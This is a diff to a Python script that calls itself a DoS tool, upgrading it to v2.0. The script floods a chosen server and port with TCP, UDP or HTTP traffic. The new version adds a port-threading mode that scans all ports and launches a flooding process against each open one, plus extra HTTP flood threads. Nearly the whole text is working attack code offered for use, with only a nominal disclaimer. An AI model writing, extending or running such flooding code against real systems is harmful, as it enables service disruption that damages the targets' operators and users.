@@ -1,7 +1,7 @@
 #! /usr/bin/env python
 # -*- coding: utf-8 -*-
 """ Python DAB ~ DoS Tool ~ By Wįłłý Fœx : @BlackVikingPro """
-""" Current Version: v1.1 """
+""" Current Version: v2.0 """
 
 """
  Python D.A.B. [ |)3|\|`/ 411 |31T(|-|3z ] ~ DoS Tool ~ By Wįłłý Fœx : @BlackVikingPro
@@ -14,55 +14,22 @@
 
  Usage | Options:
   -s [--server]		- Target server's ip/hostname
-  -p [--port]			- Port to flood with packets
-  -t [--type]			- Type of attack [udp, tcp, http]
-  -m [--message]		- Custom tcp/udp/http message to send
+  -p [--port]		- Port to flood with packets
+  -t [--type]		- Type of attack [udp, tcp, http]
+ 				-- if 'http' was chosen, define either: '--get' or '--post' for the request method.
+  -m [--message]	- Custom tcp/udp/http message to send
+  --port-threading 	- Enable port threading [ --port doesn't need to be defined if this is ]
 
  Example: ./dab.py --server loop.blackvikingpro.xyz --port 80 --type tcp --message getrekt
 """
-import os, sys, socket, time, requests, signal, platform, requests
-try:
-	from Tkinter import Tk
-	pass
-except ImportError:
-	if os.geteuid() == 0:
-		_opt = raw_input("Tkinter is required. Should we install it? Y/n ")
-		if _opt in ('y', 'Y'):
-			os.system('apt-get install python-tk')
-			os.system('clear')
-		else:
-			print ( "Please install 'python-tk' using: 'apt-get install python-tk'" )
-			sys.exit()
-	else:
-		sys.exit("Please install 'python-tk' using: 'apt-get install python-tk'")
-		pass
-	pass
+import os, sys, socket, time, requests, signal, platform, requests, threading
+from multiprocessing import Process
 
-"""
-try:
-	from django.core.validators import URLValidator
-	from django.core.exceptions import ValidationError
-	pass
-except ImportError:
-	if os.geteuid() == 0:
-		_opt = raw_input("Django is required. Should we install it? Y/n ")
-		if _opt in ('y', 'Y'):
-			os.system('pip install django')
-			os.system('clear')
-		else:
-			print ( "Please install 'django' using: 'pip install django'")
-			sys.exit()
-	else:
-		sys.exit("Please install 'django' using: 'pip install django'")
-		pass
-	pass
-"""
-
-version = 'v1.1'
+version = 'v2.0 [stable]'
 verbose = False # display verbose-level information
 
 def usage():
-	print ""
+	print ("")
 	print ( " Python D.A.B. \033[93m[ |)3|\|`/ 411 |31T(|-|3z ]\033[0m ~ DoS Tool ~ By " + str("Wįłłý Fœx") + " : @BlackVikingPro" )
 	print ( " Use at your \033[91mown\033[0m risk. I do/will not condone any \033[91millegal\033[0m activity\n I'm not responsible for your actions.\n" )
 	print ( " Usage and Syntax:\n" )
@@ -74,16 +41,17 @@ def usage():
 		pass
 	print ( "\n Usage | Options:" )
 	print ( "  -s [--server]		- Target server's ip/hostname" )
-	print ( "  -p [--port]			- Port to flood with packets" )
-	print ( "  -t [--type]			- Type of attack [udp, tcp, http]" )
-	print ( " 						-- if 'http' was chosen, define either: '--get' or '--post' for the request method." )
-	print ( "  -m [--message]		- Custom tcp/udp/http message to send")
+	print ( "  -p [--port]		- Port to flood with packets" )
+	print ( "  -t [--type]		- Type of attack [udp, tcp, http]" )
+	print ( " 				-- if 'http' was chosen, define either: '--get' or '--post' for the request method." )
+	print ( "  -m [--message]	- Custom tcp/udp/http message to send")
+	print ( "  --port-threading 	- Enable port threading [ --port doesn't need to be defined if this is ]")
 	if sys.argv[0].startswith('./'):
 		print ( "\n Example: %s --server loop.blackvikingpro.xyz --port 80 --type tcp --message getrekt" % sys.argv[0] )
 	else:
 		print ( "\n Example: ./%s --server loop.blackvikingpro.xyz --port 80 --type tcp --message getrekt" % sys.argv[0] )
 		pass
-	print ""
+	print("")
 	pass
 
 def error(message):
@@ -94,8 +62,10 @@ def warn(message):
 	print ( "\n\033[95m [*] \033[93m%s\033[0m\n " % message )
 	pass
 
+def quick_warn(message):
+	print ( "\n\033[95m [*] \033[93m%s\033[0m " % message )
+
 def signal_handler(signal, frame):
-	print ""
 	error( "Exiting cleanly..." )
 	sys.exit()
 	pass
@@ -146,6 +116,8 @@ try:
 	elif '--port' in sys.argv:
 		p_option_pos = sys.argv.index('--port')
 		port = sys.argv[(p_option_pos + 1)]
+	elif '--port-threading' in sys.argv:
+		port = 1
 	else:
 		error("Error: Port not defined.")
 		usage()
@@ -164,6 +136,21 @@ try:
 		sys.exit()
 		pass
 
+	port_threading = False
+	if '-n' in sys.argv:
+		n_option_pos = sys.argv.index('-n')
+		num_threads = int(sys.argv[(n_option_pos + 1)])
+	elif '--threads' in sys.argv:
+		n_option_pos = sys.argv.index('--threads')
+		num_threads = int(sys.argv[(n_option_pos + 1)])
+	elif '--port-threading' in sys.argv:
+		port_threading = True
+		warn("Port threading has been enabled.")
+	else:
+		warn("Using only main thread.")
+		num_threads = 1
+		pass
+
 	if ('--get' or '--GET') in sys.argv:
 		_rtype = 'get'
 		pass
@@ -178,37 +165,20 @@ try:
 		_rtype = 'get' # defining the http type is not required.
 		pass
 
-	"""
 	if '-m' in sys.argv:
 		m_option_pos = sys.argv.index('-m')
 		message = sys.argv[(m_option_pos + 1)]
+		pass
 	elif '--message' in sys.argv:
 		m_option_pos = sys.argv.index('--message')
 		message = sys.argv[(m_option_pos + 1)]
+		pass
 	else:
-		try:
-			message = open('data.txt', 'r').read()
-		except IOError:
-			file = open('data.txt', 'w') # open file in write mode
-			# file.write('henlo, i am your master') # write data to file
-			file.write(Tk().clipboard_get())
-			file.close() # close file handle
-
-			message = open('data.txt', 'r').read()
+		message = 'getrekt'
 		pass
-	"""
-	if '-m' in sys.argv:
-		m_option_pos = sys.argv.index('-m')
-		message = sys.argv[(m_option_pos + 1)]
-		pass
-	elif '--message' in sys.argv:
-		m_option_pos = sys.argv.index('--message')
-		message = sys.argv[(m_option_pos + 1)]
-		pass
-	pass
 
 	if ('-v' or '--verbose') in sys.argv:
-		print "Verbose enabled."
+		print("Verbose enabled.")
 		verbose = True
 	elif '-v' or '--verbose' not in sys.argv:
 		verbose = False
@@ -268,6 +238,7 @@ def sendpacket(_type, sock, data, server='', port=''):
 			pass
 		except socket.error as e:
 			error( "Couldn't send payload <!-- Server may be down -->" )
+			error( "%s" % e )
 			sock.close()
 			sys.exit()
 		pass
@@ -281,6 +252,20 @@ def sendpacket(_type, sock, data, server='', port=''):
 		except socket.error as e:
 			error( "Couldn't send payload <!-- Server may be down -->" )
 			sock.close() # clean close
+			sys.exit()
+		pass
+	pass
+
+def sendpacket_thread(_type, sock, data, server='', port=''):
+	if _type in ('tcp', 'TCP'):
+		try:
+			sock.send(b'%s' % data.encode())
+			time.sleep(.01) # to not break the pipe
+			return True
+			pass
+		except socket.error as e:
+			error( "Couldn't send payload <!-- Server may be down -->" )
+			sock.close()
 			sys.exit()
 		pass
 	pass
@@ -323,13 +308,10 @@ def dos_tcp(server, attack_type, message):
 				sock.close()
 				sys.exit()
 				pass
-
-			
-
 			pass
 		pass
 	except KeyboardInterrupt:
-		print ""
+		print("")
 		error( "Exiting cleanly..." )
 		sock.close()
 		sys.exit()
@@ -391,7 +373,7 @@ def dos_udp(server, attack_type, message):
 			pass
 		pass
 	except KeyboardInterrupt:
-		print ""
+		print("")
 		error( "Exiting cleanly..." )
 		sock.close()
 		sys.exit()
@@ -441,16 +423,110 @@ def flood_http(server, _type, message):
 		conn.close() # close connection so we can re-open it later
 
 		pass
-pass
+	pass
 
+def dos_tcp_thread(server, attack_type, message):
+	
+	# warn ( "Attacking \033[96m%s\033[95m:\033[96m%s\033[93m now!" % (server) )
+
+	try:
+		if attack_type in ('tcp' or 'TCP'):
+			try:
+				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # define a tcp socket
+				sock.connect((server))
+				# sock.connect((server))
+			except socket.error as e:
+				# print ( e )
+				error("Cannot connect to \033[96m%s\033[95m:\033[96m%s\033[91m. <!-- Server may be down -->" % (server))
+				sock.close()
+				sys.exit()
+			pass
+		
+		x = 0
+		while True:
+			if sendpacket_thread(attack_type, sock, message) == True:
+				nums = []
+				nums.append(x + 1)
+				_range = ['_']
+
+				for _ in _range:
+					for x in nums:
+						sys.stdout.write( " \r Packet [ %s ] sent to %s:%s! " % (x, server[0], server[1]) )
+						sys.stdout.flush()
+					pass
+				pass
+			else:
+				error("Couldn't send payload <!-- Server may be down -->")
+				sock.close()
+				sys.exit()
+				pass
+			pass
+		pass
+	except KeyboardInterrupt:
+		print("")
+		error( "Exiting cleanly..." )
+		sock.close()
+		sys.exit()
+	except socket.error as e:
+		error( "%s seems to be down or doesn't accept data on port %s. Try a different port?" % (server) )
+		error( e )
+		sock.close()
+		sys.exit()
+	pass
 
 if __name__ == '__main__':
 	# things must've checked out by now
 	if _type in ('tcp', 'TCP'):
-		dos_tcp(server, _type, message)
+
+		x = 0
+		if port_threading == False:
+			dos_tcp(server, _type, message)
+		elif port_threading == True:
+			for _port in range(1, 65535):
+				try:
+					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create/define a tcp socket
+					try:
+						sock.connect((server[0], _port))
+						quick_warn( "%s:%s seems to be open." % (server[0], _port) )
+						_continue = True
+					except socket.error:
+						_continue = False
+						pass
+					sock.close()
+
+					server = (server[0], _port)
+					# connection must've passed
+					if _continue == True:
+						warn("Starting new thread on %s:%s" % (server))
+						"""
+						th = threading.Thread(target=dos_tcp_thread, args=(server, _type, message))
+						th.daemon = True
+						th.start()
+						"""
+						proc = Process(target=dos_tcp_thread, args=(server, _type, message))
+						proc.start()
+						proc.join()
+					else:
+						pass
+				except socket.error:
+					server = (server[0], port)
+				except KeyboardInterrupt:
+					error("Exiting cleanly...")
+					# th.close()
+					# dos_tcp(server, _type, message)
+					pass
+				pass
+			pass
+		pass
 	elif _type in ('udp', 'UDP'):
 		dos_udp(server, _type, message)
 	elif _type in ('http', 'HTTP'):
+		if threading == True:
+			for x in range(1, 10):
+				th = threading.Thread(target=flood_http, args=(server, _rtype, message))
+				th.start()
+				pass
+			pass
 		flood_http(server, _rtype, message)
 		pass
 	pass
